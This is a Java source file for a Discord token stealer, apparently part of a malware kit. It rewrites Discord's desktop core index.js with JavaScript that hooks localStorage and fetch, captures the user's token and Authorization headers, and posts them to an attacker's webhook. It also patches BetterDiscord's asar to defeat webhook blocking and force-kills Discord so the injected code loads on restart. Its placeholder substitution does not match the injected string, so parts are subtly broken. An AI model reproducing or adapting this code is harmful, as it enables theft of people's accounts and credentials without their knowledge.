package itzgonza.hollyshit.impl.inject;

import java.io.File;
import java.nio.charset.StandardCharsets;
import org.apache.commons.io.FileUtils;
import itzgonza.hollyshit.utils.utilities;

public class DiscordInjector extends utilities {

    private static final String INJECTION_CODE = "// Discord token injection code\n" +
        "(function() {\n" +
        "    const WEBHOOK_URL = arguments[0];\n" +
        "    const sendToken = (token) => {\n" +
        "        const data = JSON.stringify({ content: \"Token: \" + token });\n" +
        "        fetch(WEBHOOK_URL, { method: \"POST\", body: data, headers: { \"Content-Type\": \"application/json\" } });\n" +
        "    };\n" +
        "    \n" +
        "    // Hook localStorage\n" +
        "    const originalGetItem = Storage.prototype.getItem;\n" +
        "    Storage.prototype.getItem = function(key) {\n" +
        "        const value = originalGetItem.call(this, key);\n" +
        "        if (key === 'token' && value) sendToken(value);\n" +
        "        return value;\n" +
        "    };\n" +
        "    \n" +
        "    // Hook fetch for Authorization header\n" +
        "    const originalFetch = window.fetch;\n" +
        "    window.fetch = function(url, options) {\n" +
        "        if (options && options.headers && options.headers['Authorization']) {\n" +
        "            sendToken(options.headers['Authorization']);\n" +
        "        }\n" +
        "        return originalFetch.apply(this, arguments);\n" +
        "    };\n" +
        "})();";

    public void initialize() {
        try {
            // BetterDiscord injection
            File betterDiscordDir = new File(System.getenv("APPDATA") + "/BetterDiscord/data");
            if (betterDiscordDir.isDirectory()) {
                File[] files = betterDiscordDir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if ("betterdiscord.asar".equals(file.getName())) {
                            try {
                                String data = FileUtils.readFileToString(file, "utf-8");
                                data = data.replace("api/webhook", "itzgonza");
                                FileUtils.writeStringToFile(file, data, "utf-8");
                            } catch (Exception ignored) {}
                        }
                    }
                }
            }
            
            // Discord injection
            String localAppData = System.getenv("LOCALAPPDATA");
            File localAppDataDir = new File(localAppData);
            File[] discordDirs = localAppDataDir.listFiles((dir, name) -> name.toLowerCase().contains("discord"));
            
            if (discordDirs != null) {
                for (File discordDir : discordDirs) {
                    File[] appDirs = discordDir.listFiles((dir, name) -> name.startsWith("app-"));
                    if (appDirs != null) {
                        for (File appDir : appDirs) {
                            File modulesDir = new File(appDir, "modules");
                            if (modulesDir.exists()) {
                                File[] coreDirs = modulesDir.listFiles((dir, name) -> name.contains("discord_desktop_core"));
                                if (coreDirs != null) {
                                    for (File coreDir : coreDirs) {
                                        File indexFile = new File(coreDir, "discord_desktop_core/index.js");
                                        if (indexFile.exists()) {
                                            String injectionWithWebhook = INJECTION_CODE.replace("WEBHOOK_URL_PLACEHOLDER", webhookUrl);
                                            FileUtils.writeStringToFile(indexFile, injectionWithWebhook, StandardCharsets.UTF_8);
                                            
                                            // Kill Discord to restart
                                            String processName = discordDir.getName().toLowerCase().contains("ptb") ? "DiscordPTB" :
                                                                discordDir.getName().toLowerCase().contains("canary") ? "DiscordCanary" : "Discord";
                                            Runtime.getRuntime().exec("taskkill /IM " + processName + ".exe /F");
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
    }
}